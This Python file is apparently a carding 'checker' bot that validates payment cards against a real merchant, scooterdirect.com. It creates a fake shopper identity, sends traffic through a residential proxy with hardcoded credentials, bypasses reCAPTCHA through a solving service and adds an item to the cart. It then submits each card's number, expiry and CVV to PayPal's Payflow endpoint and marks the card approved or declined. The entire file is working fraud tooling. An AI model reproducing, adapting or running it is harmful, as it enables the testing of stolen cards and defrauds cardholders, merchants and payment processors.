import html
import random
import re
from bs4 import BeautifulSoup
import uuid
import names
from requests import Session
from dataclasses import dataclass
from config.conf import RandomName , CutStr, SaveResponseHhml,capsolver

def phone_number(longitud):  
    phonenumber = ''.join([str(random.randint(0, 9)) for _ in range(longitud)])
    return phonenumber  

def cut_str(text: str, a: str, b: str) -> str: return text.split(a)[1].split(b)[0]

class ConfigsPAge:
 
    @classmethod
    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id
    @classmethod
    def RandomName(self,dato:str=None):
        if dato == 'username': 
            self.username = "{}{}{}".format(
                    names.get_first_name(),
                    names.get_last_name(),
                    random.randint(1000000,9999999)
                    )
            return self.username
         
        elif dato == 'email': 
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.email
        
        elif dato == 'password': 
            self.password = "{}{}#{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.password
        
        elif dato == 'numero':
            self.number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
            return self.number
        
        else:
            return 'valores incorrectos: >>>   BehaviorsBraintree().RandomName("username")'
    
        
    
    
    def SaveResponseHhml(self, response:str):
        with open("ResponseHhml.html", "w", encoding="utf-8") as f:
            f.write(response)

proxy_url = 'http://user-default-network-res-country-ca:T8RdYip2FvTl@proxy.proxiware.com:1337'

@dataclass
class pfb3:
    def main(self,card):
        try:
            
            cc = card.split("|")
            self.Nombre = ConfigsPAge().RandomName('username')
            self.UseMail = ConfigsPAge().RandomName('email')

            if cc[0][0] == '4': cctype = 'VI'
            elif cc[0][0] == '5': cctype = 'MC'
            elif cc[0][0] == '6': cctype = 'AE'
            self.session = Session()
            self.session.proxies.update({
                'http': proxy_url,
                'https': proxy_url
            })

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://www.scooterdirect.com/power-chair-accessories.html','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            req_1 = self.session.get('https://www.scooterdirect.com/joystick-cover.html', headers=headers)
            from_key = cut_str(req_1.text,'name="form_key" type="hidden" value="','"')

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.scooterdirect.com','priority': 'u=0, i','referer': 'https://www.scooterdirect.com/joystick-cover.html','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = {'product': '302','selected_configurable_option': '','related_product': '','item': '302','form_key': from_key,}
            response = self.session.post('https://www.scooterdirect.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuc2Nvb3RlcmRpcmVjdC5jb20vam95c3RpY2stY292ZXIuaHRtbA~~/product/302/', headers=headers, data=data,)
            
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://www.scooterdirect.com/joystick-cover.html','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            response = self.session.get('https://www.scooterdirect.com/checkout/cart/', headers=headers)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://www.scooterdirect.com/checkout/cart/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            response = self.session.get('https://www.scooterdirect.com/checkout/', headers=headers)
            token = capsolver('6LfA5H4qAAAAALprc9fre-W9guMnM6QvmsoC5nVo','https://www.scooterdirect.com/checkout/')

            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9','content-type': 'application/json','origin': 'https://www.scooterdirect.com','priority': 'u=1, i','referer': 'https://www.scooterdirect.com/checkout/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            json_data = {'cartId': '4BwtbcsS6gX9OyHP9PNLUE18Hlpflodm','paymentMethod': {'method': 'payflowpro','additional_data': {'cc_type': 'VI','cc_exp_year': f'{cc[2]}','cc_exp_month': f'{cc[1]}','cc_last_4': '9044',},},'email': self.UseMail,'billingAddress': {'countryId': 'US','regionId': '43','regionCode': 'NY','region': 'New York','street': ['Times Square, Nueva York, EE. UU.','',],'company': '','telephone': '5667849345','postcode': '10036','city': 'Manhattan','firstname': 'saddada','lastname': 'fsafafasf','saveInAddressBook': None,},}
            response = self.session.post('https://www.scooterdirect.com/rest/default/V1/guest-carts/4BwtbcsS6gX9OyHP9PNLUE18Hlpflodm/set-payment-information', headers=headers, json=json_data,)
            
            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-419,es;q=0.9','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.scooterdirect.com','priority': 'u=1, i','referer': 'https://www.scooterdirect.com/checkout/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            data = [('form_key', from_key),('captcha_form_id', 'payment_processing_request'),('payment[method]', 'payflowpro'),('g-recaptcha-response', token),('recaptcha-validate-', ''),('captcha_form_id', 'co-payment-form'),('billing-address-same-as-shipping', 'on'),('token', token),('controller', 'checkout_flow'),('cc_type', 'VI'),]
            req_2 = self.session.post('https://www.scooterdirect.com/paypal/transparent/requestSecureToken/',headers=headers, data=data,)
            securetoken = cut_str(req_2.text,'"securetoken":"','"')
            securetokenid = cut_str(req_2.text,'"securetokenid":"','"') 

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Origin': 'https://www.scooterdirect.com','Referer': 'https://www.scooterdirect.com/','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = {'result': '0','securetoken': securetoken,'securetokenid': securetokenid,'respmsg': 'Approved','result_code': '0','csc': f'{cc[3]}','expdate': f'{cc[1]}{cc[2]}','acct': f'{cc[0]}',}
            sexo = self.session.post('https://payflowlink.paypal.com/', headers=headers, data=data)
            ConfigsPAge().SaveResponseHhml(sexo.text)

            soup = BeautifulSoup(sexo.text, 'html.parser')
            input_tag = soup.find('input', {'name': 'RESPMSG'})
            input_tag2 = soup.find('input', {'name': 'EXTRSPMSG'})
            value = input_tag['value']
            value2 = input_tag2['value']
            match = re.match(r'([A-Za-z0-9\s]+)', value)  
            match2 = re.match(r'([A-Za-z0-9\s]+)', value2) 
            if match:
                decoded_value = match.group(0)
                decoded_value2 = match2.group(0)

            if 'CVV2 Mismatch' == decoded_value: return 'Approved! ✅', 'CVV2 Mismatch'+'|'+decoded_value2
            elif None == decoded_value: return 'Declined! ❌',
            else: return 'Declined! ❌',decoded_value+'|'+decoded_value2
        except: return 'Declined! ❌','Declined: 15005-This transaction cannot be processed|No account,'
    

    